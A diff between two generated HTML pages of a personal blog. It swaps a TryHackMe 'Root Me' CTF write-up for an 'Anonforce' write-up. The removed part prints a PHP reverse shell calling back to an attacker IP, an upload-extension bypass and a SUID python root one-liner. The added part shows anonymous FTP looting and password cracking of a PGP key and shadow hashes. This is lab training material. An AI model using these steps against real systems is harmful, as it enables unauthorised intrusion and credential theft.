@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Learn about PHP file upload vulnerabilities and exploit SUID bit.'><title>TryHackMe: Root Me Writeup</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Easy THM room. Learn about FTP and cracking passwords and gpg/pgp keys.'><title>TryHackMe: Anonforce Writeup</title>
 
-<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-root-me-writeup/'>
+<link rel='canonical' href='https://chaudhary1337.github.io/p/tryhackme-anonforce-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Root Me Writeup'>
-<meta property='og:description' content='Learn about PHP file upload vulnerabilities and exploit SUID bit.'>
-<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-root-me-writeup/'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Anonforce Writeup'>
+<meta property='og:description' content='Easy THM room. Learn about FTP and cracking passwords and gpg/pgp keys.'>
+<meta property='og:url' content='https://chaudhary1337.github.io/p/tryhackme-anonforce-writeup/'>
 <meta property='og:site_name' content='Tanishq Chaudhary'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='suid' /><meta property='article:published_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/1xtAlAB.png' />
-<meta name="twitter:title" content="TryHackMe: Root Me Writeup">
-<meta name="twitter:description" content="Learn about PHP file upload vulnerabilities and exploit SUID bit."><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://i.imgur.com/1xtAlAB.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ftp' /><meta property='article:tag' content='cracking' /><meta property='article:published_time' content='2021-06-28T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-28T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/cLFThE9.png' />
+<meta name="twitter:title" content="TryHackMe: Anonforce Writeup">
+<meta name="twitter:description" content="Easy THM room. Learn about FTP and cracking passwords and gpg/pgp keys."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/cLFThE9.png' />
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -354,9 +354,9 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/tryhackme-root-me-writeup/">
+            <a href="/p/tryhackme-anonforce-writeup/">
                 
-                    <img src="https://i.imgur.com/1xtAlAB.png" loading="lazy" alt="Featured image of post TryHackMe: Root Me Writeup" />
+                    <img src="https://i.imgur.com/cLFThE9.png" loading="lazy" alt="Featured image of post TryHackMe: Anonforce Writeup" />
                 
             </a>
         </div>
@@ -374,12 +374,12 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
     
 
     <h2 class="article-title">
-        <a href="/p/tryhackme-root-me-writeup/">TryHackMe: Root Me Writeup</a>
+        <a href="/p/tryhackme-anonforce-writeup/">TryHackMe: Anonforce Writeup</a>
     </h2>
 
     
     <h3 class="article-subtitle">
-        Learn about PHP file upload vulnerabilities and exploit SUID bit.
+        Easy THM room. Learn about FTP and cracking passwords and gpg/pgp keys.
     </h3>
     <footer class="article-time">
         <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
@@ -390,143 +390,220 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
 
 
 
-        <time class="article-time--published">Jun 15, 2021</time>
+        <time class="article-time--published">Jun 28, 2021</time>
     </footer></div>
 </header>
 
     <section class="article-content">
-    <p><a class="link" href="https://tryhackme.com/room/rrootme"  target="_blank" rel="noopener"
+    <h1 id="anonforce">Anonforce</h1>
+<h6 id="tags-oscp-thm">tags: <code>OSCP</code> <code>THM</code></h6>
+<p><a class="link" href="https://tryhackme.com/room/bsidesgtanonforce"  target="_blank" rel="noopener"
     >Play</a></p>
-<h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
-<h3 id="11-port-scanning">1.1 Port Scanning</h3>
-<pre><code>┌──(kali㉿kali)-[~]
-└─$ nmap -sC -sV -A 10.10.35.149
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 01:18 EDT
-Nmap scan report for 10.10.35.149
-Host is up (0.20s latency).
-Not shown: 998 closed ports
+<h2 id="1-port-scanning">1. Port Scanning</h2>
+<pre><code>Not shown: 998 closed ports
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
-|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
-|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-| http-cookie-flags:
-|   /:
-|     PHPSESSID:
-|_      httponly flag not set
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: HackIT - Home
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 35.57 seconds
-</code></pre><p>While go buster and nmap runs, I wanted to see if the website is built on php or not. The following works!</p>
-<p><code>http://10.10.35.149/index.php</code></p>
-<h3 id="12-web-enumeration">1.2 Web Enumeration</h3>
-<pre><code>┌──(kali㉿kali)-[~]
-└─$ gobuster dir -u 10.10.35.149 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
-/uploads              (Status: 301) [Size: 314] [--&gt; http://10.10.35.149/uploads/]
-/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.35.149/css/]
-/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.35.149/js/]
-/panel                (Status: 301) [Size: 312] [--&gt; http://10.10.35.149/panel/]
-</code></pre><p>Panel looks interesting, so let’s try uploading a README.md file (of this repo).</p>
-<p><img src="https://i.imgur.com/1xtAlAB.png" alt="https://i.imgur.com/1xtAlAB.png"  /></p>
-<p>Success! Let’s check the uploads page.</p>
-<p><img src="https://i.imgur.com/XV6CLIc.png" alt="https://i.imgur.com/XV6CLIc.png"  /></p>
-<h3 id="13-revshell-time">1.3 Revshell Time</h3>
-<p>Time for a phpreverseshell. Go to pentestmonkey or revshells.com and get the php one.</p>
-<pre><code>&lt;?php
-// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
-// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
-
-set_time_limit (0);
-$VERSION = &quot;1.0&quot;;
-$ip = '10.8.150.214';
-$port = 1337;
-$chunk_size = 1400;
-$write_a = null;
-$error_a = null;
-$shell = 'uname -a; w; id; sh -i';
-$daemon = 0;
-$debug = 0;
-...
-</code></pre><p>Okay, time for uploading! &hellip; and we get</p>
-<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1a725c9-6fa3-471a-890e-ed702dc32876/Untitled.png" alt="A screenshot of rejected message from the uploads page"  /></p>
-<p>Clearly the extension is working against us, since <code>.md</code> passed.</p>
-<p>So let&rsquo;s see what other extensions are allowed. <a class="link" href="https://www.guru99.com/what-is-php-first-php-program.html"  target="_blank" rel="noopener"
-    >Source</a></p>
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+| drwxr-xr-x   17 0        0            3700 Jun 27 19:02 dev
+| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -&gt; boot/initrd.img-4.4.0-157-generic
+| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -&gt; boot/initrd.img-4.4.0-142-generic
+| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
+| drwx------    2 0        0           16384 Aug 11  2019 lost+found
+| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
+| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
+| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
+| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
+| dr-xr-xr-x  103 0        0               0 Jun 27 19:02 proc
+| drwx------    3 0        0            4096 Aug 11  2019 root
+| drwxr-xr-x   18 0        0             540 Jun 27 19:02 run
+| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
+| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
+| dr-xr-xr-x   13 0        0               0 Jun 27 19:02 sys
+| drwxrwxrwt    9 0        0            4096 Jun 27 19:02 tmp [NSE: writeable]
+| drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
+| drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
+| lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -&gt; boot/vmlinuz-4.4.0-157-generic
+|_lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-142-generic
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.17.8.184
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
+|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
+|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Information gathered:</p>
 <ul>
-<li>.phtml</li>
-<li>.php3</li>
-<li>.php4</li>
-<li>.php5</li>
-<li>.phps</li>
+<li>FTP running on port 21, with anon login allowed!</li>
+<li>SSH open</li>
 </ul>
-<p>Okay. One by one.</p>
-<h2 id="2-foothold">2. Foothold</h2>
-<p><img src="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4cc0a26-2daa-4b74-82bc-afc81ac4bed0/Untitled.png" alt="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4cc0a26-2daa-4b74-82bc-afc81ac4bed0/Untitled.png"  /></p>
-<p>Ha! <code>.phtml</code> works! Lesgooo</p>
+<p>A full scan does not reveal any additional information.</p>
+<h2 id="2-ftp-anonymous-login">2. FTP: Anonymous Login</h2>
+<p>We explore a bit.</p>
+<pre><code>ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 .
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 ..
+-rw-------    1 0        0             117 Aug 11  2019 .bash_history
+-rw-r--r--    1 1000     1000          220 Aug 11  2019 .bash_logout
+-rw-r--r--    1 1000     1000         3771 Aug 11  2019 .bashrc
+drwx------    2 1000     1000         4096 Aug 11  2019 .cache
+drwxrwxr-x    2 1000     1000         4096 Aug 11  2019 .nano
+-rw-r--r--    1 1000     1000          655 Aug 11  2019 .profile
+-rw-r--r--    1 1000     1000            0 Aug 11  2019 .sudo_as_admin_successful
+-rw-r--r--    1 0        0             183 Aug 11  2019 .wget-hsts
+-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
+226 Directory send OK.
+ftp&gt; pwd
+257 &quot;/home/melodias&quot; is the current directory
+</code></pre><p>We get the user.txt file!</p>
+<h2 id="3-more-exploration">3. More Exploration</h2>
+<p>I noticed a directory named <code>/notread</code>, with all the permissions :o</p>
+<pre><code>ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
+-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
+226 Directory send OK.
+ftp&gt; pwd
+257 &quot;/notread&quot; is the current directory
+ftp&gt; get backup.pgp
+local: backup.pgp remote: backup.pgp
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for backup.pgp (524 bytes).
+226 Transfer complete.
+524 bytes received in 0.00 secs (5.6787 MB/s)
+ftp&gt; get private.asc
+local: private.asc remote: private.asc
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for private.asc (3762 bytes).
+226 Transfer complete.
+3762 bytes received in 0.00 secs (10.5833 MB/s)
+ftp&gt; 
+221 Goodbye.
+</code></pre><p>Looks like we have pgp and asc files. Here&rsquo;s what to do next.</p>
+<ul>
+<li>Import private.asc key</li>
+<li>if it asks for a password, use <code>gpg2john</code> to get the passphase</li>
+<li>decrypt the pgp key</li>
+</ul>
+<p>Easy!</p>
+<h2 id="4-to-root">4. To root!</h2>
 <pre><code>┌──(kali㉿kali)-[/tmp]
-└─$ nc -lvnp 1337      
-listening on [any] 1337 ...
-connect to [10.8.150.214] from (UNKNOWN) [10.10.35.149] 33678
-Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
- 05:39:36 up 30 min,  0 users,  load average: 0.00, 0.01, 0.18
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-sh: 0: can't access tty; job control turned off
-$ whoami
-www-data
-$ pwd
-/                                                                                 
-$ ls                                                                              
-bin                                                                               
-boot                                                                              
-cdrom                                                                             
-dev
-... 
-</code></pre><h2 id="3-privesc">3. PrivEsc</h2>
-<pre><code>www-data@rootme:/home/rootme$ find / -type f -perm -u=s 2&gt;/dev/null
-find / -type f -perm -u=s 2&gt;/dev/null                                                                                                                                   
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                             
-/usr/lib/snapd/snap-confine                                                                                                                                             
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/openssh/ssh-keysign
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/bin/traceroute6.iputils
-/usr/bin/newuidmap
-/usr/bin/newgidmap
-/usr/bin/chsh
-/usr/bin/python
-/usr/bin/at
-/usr/bin/chfn
-/usr/bin/gpasswd
-/usr/bin/sudo
-/usr/bin/newgrp
-/usr/bin/passwd
-/usr/bin/pkexec
-/snap/core/8268/bin/mount
-...
-/snap/core/9665/usr/sbin/pppd
-/bin/mount
-/bin/su
-/bin/fusermount
-/bin/ping
-/bin/umount
-</code></pre><p>python thing looks interesting. <a class="link" href="https://gtfobins.github.io/gtfobins/python/#suid"  target="_blank" rel="noopener"
-    >gtfobins</a> ftw!</p>
-<pre><code>www-data@rootme:/$ /usr/bin/python -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
-&lt;hon -c 'import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)'
-whoami
-root
-bash -i
-bash: cannot set terminal process group (891): Inappropriate ioctl for device
-bash: no job control in this shell
-bash-4.4$
-</code></pre><p>We are done!</p>
+└─$ gpg2john private.asc &gt; hash
+
+File private.asc
+                                                                                                                          
+┌──(kali㉿kali)-[/tmp]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+{password_here!}          (anonforce)
+1g 0:00:00:00 DONE (2021-06-27 22:31) 20.00g/s 18600p/s 18600c/s 18600C/s lolipop..sheena
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+                                                                                                                          
+┌──(kali㉿kali)-[/tmp]
+└─$ gpg --import private.asc 
+gpg: key B92CD1F280AD82C2: &quot;anonforce &lt;melodias@anonforce.nsa&gt;&quot; not changed
+gpg: key B92CD1F280AD82C2: secret key imported
+gpg: key B92CD1F280AD82C2: &quot;anonforce &lt;melodias@anonforce.nsa&gt;&quot; not changed
+gpg: Total number processed: 2
+gpg:              unchanged: 2
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+                                                                                                                          
+┌──(kali㉿kali)-[/tmp]
+└─$ gpg --decrypt backup.pgp 
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
+      &quot;anonforce &lt;melodias@anonforce.nsa&gt;&quot;
+root:{root_details_were_here}
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+ftp:*:18120:0:99999:7:::  
+</code></pre><p>Let&rsquo;s try going to root directly?</p>
+<pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ john root --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 6 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+{root_password_yes!}           (root)
+1g 0:00:00:00 DONE (2021-06-27 22:33) 1.111g/s 7680p/s 7680c/s 7680C/s horoscope..better
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre><pre><code>┌──(kali㉿kali)-[/tmp]
+└─$ ssh root@10.10.66.12  
+The authenticity of host '10.10.66.12 (10.10.66.12)' can't be established.
+ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.66.12' (ECDSA) to the list of known hosts.
+root@10.10.66.12's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ubuntu:~# ls
+root.txt
+</code></pre><p>And we are done!</p>
 
 </section>
 
@@ -535,7 +612,9 @@ bash-4.4$
     
     <section class="article-tags">
         
-            <a href="/tags/suid/">suid</a>
+            <a href="/tags/ftp/">ftp</a>
+        
+            <a href="/tags/cracking/">cracking</a>
         
     </section>
 
@@ -551,6 +630,24 @@ bash-4.4$
         <h2 class="section-title">Related contents</h2>
         <div class="related-contents">
             <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-mustacchio-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/dorXlbA.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/dorXlbA.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Mustacchio Writeup</h2>
+        </div>
+    </a>
+</article>
                 
                     
 <article class="has-image">
@@ -572,72 +669,54 @@ bash-4.4$
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-coldbox-writeup-all-paths/">
+    <a href="/p/tryhackme-break-out-the-cage-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/k2cJkVq.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/k2cJkVq.png"/>
+                    <img src="https://i.imgur.com/0MxLYQa.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/0MxLYQa.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: ColdBox Writeup (All Paths)</h2>
+            <h2 class="article-title">TryHackMe: Break Out The Cage Writeup</h2>
         </div>
     </a>
 </article>
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-mr-robot-writeup/">
+    <a href="/p/tryhackme-overpass3-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/gsFux0D.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/gsFux0D.png"/>
+                    <img src="https://i.imgur.com/ElTbvct.jpg" loading="lazy" data-key="" data-hash="https://i.imgur.com/ElTbvct.jpg"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: Mr Robot Writeup</h2>
+            <h2 class="article-title">TryHackMe: Overpass3 Writeup</h2>
         </div>
     </a>
 </article>
                 
                     
 <article class="has-image">
-    <a href="/p/tryhackme-vuln-university-writeup/">
+    <a href="/p/tryhackme-startup-writeup/">
         
         
             <div class="article-image">
                 
-                    <img src="https://i.imgur.com/5x36aqY.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/5x36aqY.png"/>
+                    <img src="https://i.imgur.com/xPZaCyo.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/xPZaCyo.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">TryHackMe: Vuln University Writeup</h2>
-        </div>
-    </a>
-</article>
-                
-                    
-<article class="has-image">
-    <a href="/p/tryhackme-anonforce-writeup/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://i.imgur.com/cLFThE9.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/cLFThE9.png"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">TryHackMe: Anonforce Writeup</h2>
+            <h2 class="article-title">TryHackMe: Startup Writeup</h2>
         </div>
     </a>
 </article>
